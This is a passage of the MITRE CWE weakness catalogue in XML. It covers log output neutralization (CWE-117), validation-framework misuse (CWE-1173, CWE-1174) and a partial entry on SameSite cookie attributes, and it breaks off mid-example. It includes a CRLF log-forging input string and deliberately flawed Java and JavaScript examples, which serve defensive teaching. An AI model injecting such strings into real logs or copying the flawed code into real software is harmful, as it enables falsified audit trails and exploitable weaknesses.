               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Name, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Relationship_Notes, Relationships, Research_Gaps, Terminology_Notes, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations, References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationship_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Likelihood_of_Exploit, References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Relationships, Terminology_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Output Validation</Previous_Entry_Name>
            <Previous_Entry_Name Date="2008-09-09">Incorrect Output Sanitization</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Insufficient Output Sanitization</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="117" Name="Improper Output Neutralization for Logs" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not neutralize or incorrectly neutralizes output that is written to logs.</Description>
         <Extended_Description>
            <xhtml:p>This can allow an attacker to forge log entries or inject malicious content into logs.</xhtml:p>
            <xhtml:p>Log forging vulnerabilities occur when:</xhtml:p>
               <xhtml:ol>
                  <xhtml:li>Data enters an application from an untrusted source.</xhtml:li>
                  <xhtml:li>The data is written to an application or system log file.</xhtml:li>
               </xhtml:ol>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="116" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="700" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Applications typically use log files to store a history of events or transactions for later review, statistics gathering, or debugging. Depending on the nature of the application, the task of reviewing log files may be performed manually on an as-needed basis or automated with a tool that automatically culls logs for important events or trending information.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Hide Activities</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Interpretation of the log files may be hindered or misdirected if an attacker can supply data to the application that is subsequently logged verbatim. In the most benign case, an attacker may be able to insert false entries into the log file by providing the application with input that includes appropriate characters. Forged or otherwise corrupted log files can be used to cover an attacker's tracks, possibly by skewing statistics, or even to implicate another party in the commission of a malicious act. If the log file is processed automatically, the attacker can render the file unusable by corrupting the format of the file or injecting unexpected characters. An attacker may inject code or other commands into the log file and take advantage of a vulnerability in the log processing utility.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-30">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-20">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following web application code attempts to read an integer value from a request object. If the parseInt call fails, then the input is logged with an error message indicating what happened.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String val = request.getParameter("val");<xhtml:br/>try {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>int value = Integer.parseInt(val);</xhtml:div>
                     </xhtml:div>}<xhtml:br/>catch (NumberFormatException) {<xhtml:div style="margin-left:1em;">log.info("Failed to parse val = " + val);</xhtml:div>}<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>If a user submits the string "twenty-one" for val, the following entry is logged:</Body_Text>
               <Body_Text>
                  <xhtml:ul>
                     <xhtml:li>
                        <xhtml:div>INFO: Failed to parse val=twenty-one</xhtml:div>
                     </xhtml:li>
                  </xhtml:ul>
               </Body_Text>
               <Body_Text>However, if an attacker submits the string "twenty-one%0a%0aINFO:+User+logged+out%3dbadguy", the following entry is logged:</Body_Text>
               <Body_Text>
                  <xhtml:ul>
                     <xhtml:li>
                        <xhtml:div>INFO: Failed to parse val=twenty-one</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>INFO: User logged out=badguy</xhtml:div>
                     </xhtml:li>
                  </xhtml:ul>
               </Body_Text>
               <Body_Text>Clearly, attackers can use this same mechanism to insert arbitrary log entries.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2006-4624</Reference>
               <Description>Chain: inject fake log entries with fake timestamps using CRLF injection</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4624</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Log Forging</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>IDS03-J</Entry_ID>
               <Entry_Name>Do not log unsanitized user input</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Oracle Coding Standard for Java">
               <Entry_ID>IDS03-J</Entry_ID>
               <Entry_Name>Do not log unsanitized user input</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="268"/>
            <Related_Attack_Pattern CAPEC_ID="81"/>
            <Related_Attack_Pattern CAPEC_ID="93"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-52"/>
            <Reference External_Reference_ID="REF-53"/>
            <Reference External_Reference_ID="REF-43"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated References, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, References, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Background_Details, Common_Consequences, Description, Other_Notes, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Name, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Other_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Log Forging</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Incorrect Output Sanitization for Logs</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Improper Output Sanitization for Logs</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="1173" Name="Improper Use of Validation Framework" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not use, or incorrectly uses, an input validation framework that is provided by the source language or an independent library.</Description>
         <Extended_Description>Many modern coding languages provide developers with input validation frameworks to make the task of input validation easier and less error-prone. These frameworks will automatically check all input against specified criteria and direct execution to error handlers when invalid input is received. The improper use (i.e., an incorrect implementation or missing altogether) of these frameworks is not directly exploitable, but can lead to an exploitable condition if proper input validation is not performed later in the product. Not using provided input validation frameworks can also hurt the maintainability of code as future developers may not recognize the downstream input validation being used in the place of the validation framework.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Indirect</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This weakness may occur when software designers choose to not leverage input validation frameworks provided by the source language.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>This weakness may occur when developers do not correctly use a provided input validation framework.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
               <Note>Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-3">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Some instances of improper input validation can be detected using automated static analysis.</xhtml:p>
                  <xhtml:p>A static analysis tool might allow the user to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present.</xhtml:p>
                  <xhtml:p>Except in the cases described in the previous paragraph, automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
               </Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
	   <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Properly use provided input validation frameworks.</Description>
	   </Mitigation>
         </Potential_Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2018-12-21</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1174" Name="ASP.NET Misconfiguration: Improper Model Validation" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The ASP.NET application does not use, or incorrectly uses, the model validation framework.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1173" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Indirect</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="ASP.NET" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
               <Note>Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.</Note>
            </Consequence>
         </Common_Consequences>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2018-12-21</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1275" Name="Sensitive Cookie with Improper SameSite Attribute" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The SameSite attribute for sensitive cookies is not set, or an insecure value is used.</Description>
         <Extended_Description>The SameSite attribute controls how cookies are sent for cross-domain requests. This attribute may have three values: 'Lax', 'Strict', or 'None'. If the 'None' value is used, a website may create a cross-domain POST HTTP request to another website, and the browser automatically adds cookies to this request. This may lead to Cross-Site-Request-Forgery (CSRF) attacks if there are no additional protections in place (such as Anti-CSRF tokens).</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="923" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="352" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
			<Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
			<Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>This weakness occurs during implementation when the coder does not properly set the SameSite attribute.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Non-Repudiation</Scope>
               <Scope>Access Control</Scope>
               <Impact>Modify Application Data</Impact>
               <Likelihood>Low</Likelihood>
               <Note>If the website does not impose additional defense against CSRF attacks, failing to use the 'Lax' or 'Strict' values could increase the risk of exposure to CSRF attacks. The likelihood of the integrity breach is Low because a successful attack does not only depend on an insecure SameSite attribute. In order to perform a CSRF attack there are many conditions that must be met, such as the lack of CSRF tokens, no confirmations for sensitive actions on the website, a "simple" "Content-Type" header in the HTTP request and many more.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Set the SameSite attribute of a sensitive cookie to 'Lax' or 'Strict'. This instructs the browser to apply this cookie only to same-domain requests, which provides a good Defense in Depth against CSRF attacks. When the 'Lax' value is in use, cookies are also sent for top-level cross-domain navigation via HTTP GET, HEAD, OPTIONS, and TRACE methods, but not for other HTTP methods that are more like to cause side-effects of state mutation.</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies. Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In this example, a cookie is used to store a session ID for a client's interaction with a website. The snippet of code below establishes a new cookie to hold the sessionID.</Intro_Text>
               <Example_Code Nature="Bad" Language="JavaScript">
		 let sessionId = generateSessionId()<xhtml:br/>
                 let cookieOptions = { domain: 'example.com' }<xhtml:br/>
                 response.cookie('sessionid', sessionId, cookieOptions)<xhtml:br/>
               </Example_Code>
